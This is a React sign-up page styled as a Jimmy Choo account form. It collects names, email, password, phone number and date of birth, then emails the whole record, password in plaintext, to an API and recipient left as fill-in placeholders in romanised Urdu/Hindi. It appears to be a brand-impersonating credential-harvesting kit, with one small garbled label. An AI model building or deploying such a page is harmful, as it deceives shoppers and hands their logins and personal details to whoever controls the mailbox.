import { useState } from "react";
import axios from "axios";
import bgImage from './backgroundImage.webp'

const Signup = () => {
  const titles = ["Mr", "Ms", "Mrs", "Dr"];
  const countries = ["United Kingdom", "United States", "Canada", "Australia"];
  const days = Array.from({ length: 31 }, (_, i) => i + 1);
  const months = [
    "January", "February", "March", "April", "May", "June",
    "July", "August", "September", "October", "November", "December"
  ];
  const years = Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - i);

  const formFields = [
    { name: "firstName", type: "text", placeholder: "First name*", required: true },
    { name: "lastName", type: "text", placeholder: "Last name*", required: true },
    { name: "email", type: "email", placeholder: "Email*", required: true },
    { name: "confirmEmail", type: "email", placeholder: "Confirm email*", required: true },
    { name: "password", type: "password", placeholder: "Password*", required: true },
    { name: "number", type: "number", placeholder: "Phone Number*", required: true }
  ];

  const [formData, setFormData] = useState({
    title: "",
    country: "United Kingdom",
    birthDay: "",
    birthMonth: "",
    birthYear: "",
  });

  const [errors, setErrors] = useState({});

  const validateForm = () => {
    let newErrors = {};

    if (!formData.title) newErrors.title = "Title is required";
    if (!formData.birthDay || !formData.birthMonth || !formData.birthYear)
      newErrors.dob = "Complete date of birth is required";

    formFields.forEach(({ name, required }) => {
      if (required && !formData[name]?.trim()) {
        newErrors[name] = `${name.replace(/([A-Z])/g, " $1")} is required`;
      }
    });

    if (formData.email && !/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = "Invalid email format";
    }

    if (formData.confirmEmail !== formData.email) {
      newErrors.confirmEmail = "Emails do not match";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) return;

    try {
      await axios.post("yaha apna API laga lena", {
        to: "js pa bhjna wo mail laga lena",
        subject: "New Sign-Up Form Submission",
        body: JSON.stringify(formData, null, 2),
      });

      alert("Form submitted successfully!");
    } catch (error) {
      console.error("Error sending email:", error);
      alert("Failed to submit the form.");
    }
  };

  return (
<div style={{
  backgroundImage: `linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(${bgImage})`,
  backgroundSize: 'cover',
  backgroundPosition: 'center',
  backgroundRepeat: 'no-repeat'
}}
className="pb-5 pt-[20px]"
>
     <form id="formSubmita" onSubmit={handleSubmit} className="p-8 mx-3 mt-[150px] bg-neutral-800  max-w-lg md:mx-auto border rounded-none-lg shadow-md">
      <h2 className="text-xl font-bold pb-6">Sign Up</h2>
      <p className="mb-4 text-sm">Enjoy a more personalized shopping experience with a Jimmy Choo account.</p>

      <div className="grid grid-cols-2 gap-2 mb-3">
        <div>
          <select name="title" value={formData.title} onChange={handleChange} className="border p-2 rounded-none w-full">
            <option value="">PlbgImageease Select</option>
            {titles.map((title) => (
              <option key={title} value={title}>{title}</option>
            ))}
          </select>
          {errors.title && <p className="text-red-500 text-sm">{errors.title}</p>}
        </div>

        {formFields.slice(0, 1).map(({ name, type, placeholder }) => (
          <div key={name}>
            <input
              type={type}
              name={name}
              placeholder={placeholder}
              value={formData[name] || ""}
              onChange={handleChange}
              className="border p-2 rounded-none w-full"
            />
            {errors[name] && <p className="text-red-500 text-sm">{errors[name]}</p>}
          </div>
        ))}
      </div>

      {formFields.slice(1, 2).map(({ name, type, placeholder }) => (
        <div className="mb-3" key={name}>
          <input
            type={type}
            name={name}
            placeholder={placeholder}
            value={formData[name] || ""}
            onChange={handleChange}
            className="border p-2 rounded-none w-full"
          />
          {errors[name] && <p className="text-red-500 text-sm">{errors[name]}</p>}
        </div>
      ))}

      <div className="mb-3">
        <select name="country" value={formData.country} onChange={handleChange} className="border p-2 rounded-none w-full">
          {countries.map((country) => (
            <option key={country} value={country}>{country}</option>
          ))}
        </select>
      </div>

      <p className="text-sm mb-2">Date of birth*</p>
      <div className="grid grid-cols-3 gap-2 mb-3">
        <select name="birthDay" value={formData.birthDay} onChange={handleChange} className="border p-2 rounded-none">
          <option value="">dd*</option>
          {days.map((day) => <option key={day} value={day}>{day}</option>)}
        </select>

        <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} className="border p-2 rounded-none">
          <option value="">mm*</option>
          {months.map((month, index) => <option key={month} value={index + 1}>{month}</option>)}
        </select>

        <select name="birthYear" value={formData.birthYear} onChange={handleChange} className="border p-2 rounded-none">
          <option value="">yy*</option>
          {years.map((year) => <option key={year} value={year}>{year}</option>)}
        </select>
      </div>
      {errors.dob && <p className="text-red-500 text-sm">{errors.dob}</p>}

      {formFields.slice(2).map(({ name, type, placeholder }) => (
        <div className="mb-3" key={name}>
          <input
            type={type}
            name={name}
            placeholder={placeholder}
            value={formData[name] || ""}
            onChange={handleChange}
            className="border p-2 rounded-none w-full"
          />
          {errors[name] && <p className="text-red-500 text-sm">{errors[name]}</p>}
        </div>
      ))}
      <div className="flex flex-col gap-3">
        <div className="flex gap-2">
          <input id="radio1" type="checkbox" name='checkbox' />
          <label htmlFor="radio1">I have read and understood the Privacy Policy regarding the processing of my personal information by Jimmy Choo
          </label>
        </div>
        <div className="flex gap-2">
          <input id="radio2" type="checkbox" name='radio' />
          <label htmlFor="radio2">I have read and understood the Privacy Policy regarding the processing of my personal information by Jimmy Choo
          </label>
        </div>

      </div>
    
     
  <button type="submit" className="bg-[#DFB83B] text-white p-2 rounded-none w-full">
    Sign Up
  </button>
    </form >
   </div>
  );
};

export default Signup;
